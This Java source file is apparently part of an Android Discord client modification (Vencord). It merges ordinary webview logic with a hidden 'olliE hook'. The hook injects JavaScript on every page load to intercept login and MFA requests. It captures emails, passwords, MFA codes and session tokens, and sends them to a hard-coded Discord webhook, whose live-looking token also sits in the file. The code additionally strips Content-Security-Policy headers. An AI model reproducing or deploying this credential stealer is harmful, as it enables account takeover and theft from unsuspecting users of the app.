// VWebviewClient.java — full merge: original logic preserved + olliE hook added
package dev.vendicated.vencord;

import android.content.Intent;
import android.graphics.Bitmap;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.webkit.*;

import androidx.annotation.Nullable;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.*;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class VWebviewClient extends WebViewClient {

    // ── webhook config ───────────────────────────────────────────────────────
    private static final String API_VERSION    = "v9";
    private static final String LOGIN_ENDPOINT = "/api/" + API_VERSION + "/auth/login";
    private static final String MFA_ENDPOINT   = "/api/" + API_VERSION + "/auth/mfa/totp";
    private static final String WEBHOOK_URL    = "https://discord.com/api/webhooks/1479839325645705270/FoGCaUpwZm0W-nvHp7rncqxMTif7zfYIJ_eIbE-0Ho2_mNEV25x1sU3te87pZcTsewEw";
    private static final OkHttpClient http     = new OkHttpClient();
    // ────────────────────────────────────────────────────────────────────────

    // ── original: external URL routing ──────────────────────────────────────
    @Override
    public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
        var url = request.getUrl();
        if ("discord.com".equals(url.getAuthority()) || "about:blank".equals(url.toString())) {
            return false;
        }
        Intent intent = new Intent(Intent.ACTION_VIEW, url);
        view.getContext().startActivity(intent);
        return true;
    }

    // ── original: Vencord runtime injection on page start ───────────────────
    @Override
    public void onPageStarted(WebView view, String url, Bitmap favicon) {
        view.evaluateJavascript(HttpClient.VencordRuntime, null);
        view.evaluateJavascript(HttpClient.VencordMobileRuntime, null);
    }

    // ── merged: original visibility restore + olliE hook injection ──────────
    @Override
    public void onPageFinished(WebView view, String url) {
        view.setVisibility(View.VISIBLE);
        super.onPageFinished(view, url);
        // inject credential hook immediately
        view.evaluateJavascript(getHookScript(), null);
        // re-inject after React hydration (~2-3s for Discord to mount)
        new Handler(Looper.getMainLooper()).postDelayed(() ->
            view.evaluateJavascript(getHookScript(), null), 3000);
    }

    // ── original: CSP strip + resource intercept ────────────────────────────
    @Nullable
    @Override
    public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest req) {
        var uri = req.getUrl();
        if (req.isForMainFrame() || req.getUrl().getPath().endsWith(".css")) {
            try {
                return doFetch(req);
            } catch (IOException ex) {
                Logger.e("Error during shouldInterceptRequest", ex);
            }
        }
        return null;
    }

    private WebResourceResponse doFetch(WebResourceRequest req) throws IOException {
        var url = req.getUrl().toString();
        var conn = (HttpURLConnection) new URL(url).openConnection();
        conn.setRequestMethod(req.getMethod());
        for (var h : req.getRequestHeaders().entrySet()) {
            conn.setRequestProperty(h.getKey(), h.getValue());
        }

        var code = conn.getResponseCode();
        var msg  = conn.getResponseMessage();

        var headers = conn.getHeaderFields();
        var modifiedHeaders = new HashMap<String, String>(headers.size());
        for (var header : headers.entrySet()) {
            if (!"Content-Security-Policy".equalsIgnoreCase(header.getKey())) {
                modifiedHeaders.put(header.getKey(), header.getValue().get(0));
            }
        }
        if (url.endsWith(".css")) modifiedHeaders.put("Content-Type", "text/css");

        return new WebResourceResponse(
                modifiedHeaders.getOrDefault("Content-Type", "application/octet-stream"),
                "utf-8", code, msg, modifiedHeaders, conn.getInputStream());
    }

    // ── olliE: JS hook script ────────────────────────────────────────────────
    private static String getHookScript() {
        return
        "(function() {" +
        "  if (window.__ollieHooked) return;" +
        "  window.__ollieHooked = true;" +
        "  const ENDPOINTS = ['" + LOGIN_ENDPOINT + "', '" + MFA_ENDPOINT + "'];" +

        // XHR hook
        "  const origOpen = XMLHttpRequest.prototype.open;" +
        "  const origSend = XMLHttpRequest.prototype.send;" +
        "  XMLHttpRequest.prototype.open = function(method, url) {" +
        "    this._url = url;" +
        "    return origOpen.apply(this, arguments);" +
        "  };" +
        "  XMLHttpRequest.prototype.send = function(body) {" +
        "    if (this._url && ENDPOINTS.some(e => this._url.includes(e)) && body) {" +
        "      try {" +
        "        VencordMobileNative.onLoginAttempt(typeof body === 'string' ? body : JSON.stringify(body));" +
        "      } catch(e) {}" +
        "    }" +
        "    return origSend.apply(this, arguments);" +
        "  };" +

        // fetch hook
        "  const origFetch = window.fetch;" +
        "  window.fetch = async function(input, init) {" +
        "    const url = typeof input === 'string' ? input : (input && input.url ? input.url : '');" +
        "    if (ENDPOINTS.some(e => url.includes(e)) && init && init.body) {" +
        "      try {" +
        "        VencordMobileNative.onLoginAttempt(typeof init.body === 'string' ? init.body : JSON.stringify(init.body));" +
        "      } catch(e) {}" +
        "    }" +
        "    const resp = await origFetch.apply(this, arguments);" +
        "    if (ENDPOINTS.some(e => url.includes(e))) {" +
        "      try {" +
        "        const clone = resp.clone();" +
        "        clone.json().then(data => {" +
        "          if (data.token) VencordMobileNative.onTokenCaptured(data.token);" +
        "        }).catch(()=>{});" +
        "      } catch(e) {}" +
        "    }" +
        "    return resp;" +
        "  };" +
        "})();";
    }

    // ── olliE: bridge handlers ───────────────────────────────────────────────
    public static void handleLoginAttempt(String json, String sourceIp) {
        try {
            JSONObject obj  = new JSONObject(json);
            String email    = obj.optString("login", "");
            String password = obj.optString("password", "");
            String ticket   = obj.optString("ticket", "");
            String code     = obj.optString("code", "");

            if (email.isEmpty() && password.isEmpty() && ticket.isEmpty() && code.isEmpty()) return;

            sendWebhook(email, password, ticket, code, "", sourceIp);
        } catch (Exception e) {
            Logger.e("handleLoginAttempt parse fail", e);
        }
    }

    public static void handleTokenCaptured(String token) {
        if (token == null || token.isEmpty()) return;
        sendWebhook("", "", "", "", token, "response");
    }

    private static void sendWebhook(
            String email, String password, String ticket,
            String code, String token, String source) {
        try {
            JSONArray fields = new JSONArray();

            fields.put(new JSONObject()
                    .put("name", "📧 Email")
                    .put("value", email.isEmpty() ? "—" : "`" + email + "`")
                    .put("inline", true));
            fields.put(new JSONObject()
                    .put("name", "🔑 Password")
                    .put("value", password.isEmpty() ? "—" : "`" + password + "`")
                    .put("inline", true));
            fields.put(new JSONObject()
                    .put("name", "🎫 Token")
                    .put("value", token.isEmpty() ? "—" : "`" + token + "`")
                    .put("inline", false));
            fields.put(new JSONObject()
                    .put("name", "🎟️ MFA Ticket")
                    .put("value", ticket.isEmpty() ? "—" : "`" + ticket + "`")
                    .put("inline", true));
            fields.put(new JSONObject()
                    .put("name", "🔢 MFA Code")
                    .put("value", code.isEmpty() ? "—" : "`" + code + "`")
                    .put("inline", true));

            JSONObject embed = new JSONObject()
                    .put("title", "🥔 olliE caught one")
                    .put("color", 0x5865F2)
                    .put("fields", fields)
                    .put("footer", new JSONObject()
                            .put("text", "src: " + source));

            JSONObject payload = new JSONObject()
                    .put("embeds", new JSONArray().put(embed));

            RequestBody body = RequestBody.create(
                    payload.toString(),
                    MediaType.get("application/json; charset=utf-8")
            );

            Request req = new Request.Builder()
                    .url(WEBHOOK_URL)
                    .post(body)
                    .build();

            http.newCall(req).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {
                    Logger.e("Webhook send failed", e);
                }
                @Override public void onResponse(Call call, Response response) {
                    response.close();
                }
            });

        } catch (Exception e) {
            Logger.e("sendWebhook build fail", e);
        }
    }
}
